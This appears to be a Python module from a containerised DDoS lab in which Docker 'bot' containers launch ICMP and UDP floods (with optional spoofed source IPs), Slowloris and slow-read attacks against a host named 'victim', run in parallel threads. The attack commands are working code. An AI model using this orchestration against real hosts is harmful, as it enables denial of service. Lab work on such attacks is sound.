import docker, threading, sqlite3, time
from flask import request
from .settings import client
from app import db


def icmp_flood(container_id, ip_address):
    container = client.containers.get(container_id)
    if ip_address: # If user wants to spoof src IP
        result = container.exec_run(
            f"hping3 --icmp --flood -a {ip_address} victim"
        )
    else:
        result = container.exec_run("hping3 --icmp --flood victim")
    print(result.output.decode())


def udp_flood(container_id, ip_address):
    container = client.containers.get(container_id)
    if ip_address: # If user wants to spoof src IP
        result = container.exec_run(
            f"hping3 --udp -p 80 --flood -a {ip_address} victim"
        )
    else:
        result = container.exec_run("hping3 --udp --flood victim")
    print(result.output.decode())


def slowloris(container_id, number_of_connections, connection_rate, attack_duration):
    container = client.containers.get(container_id)
    result = container.exec_run(
        f"slowhttptest -c {number_of_connections} -r {connection_rate} -l {attack_duration} -g -u http://victim"
    )
    print(result.output.decode())

def slow_read(container_id, number_of_connections, connection_rate, attack_duration, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end):
    container = client.containers.get(container_id)
    result = container.exec_run(
        f"slowhttptest  -X -k {pipeline_factor} -c {number_of_connections} -r {connection_rate} -l {attack_duration} -n {read_interval} -z {read_bytes} -w {window_size_start} -y {window_size_end} -g -u http://victim"
    )
    print(result.output.decode())


def execute_attack(attack, duration, *args): 
    container_ids = [x[0] for x in db.get_bot_ids()]
    threads = [
        threading.Thread(target=attack, args=(container_id, *args))
        for container_id in container_ids
    ]

    # Start all threads
    for thread in threads:
        thread.start()

    if attack.__name__ == "icmp_flood":
        # Wait for the specified duration
        time.sleep(duration)

        # Stop icmp flood after duration
        for container_id in container_ids:
            threading.Thread(target=stop_attack, args=(container_id,)).start()
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    return "Attack finished"

def stop_attack(container_id):
    container = client.containers.get(container_id)
    result = container.exec_run("pkill hping3")
    print(result.output.decode())


# def hping_duration(container_id, duration): # Hping3 itself doesnt have flag for duration set, this is for it
#     while duration > 0:
#             time.sleep(1)
#             duration -= 1
#     stop_attack(container_id)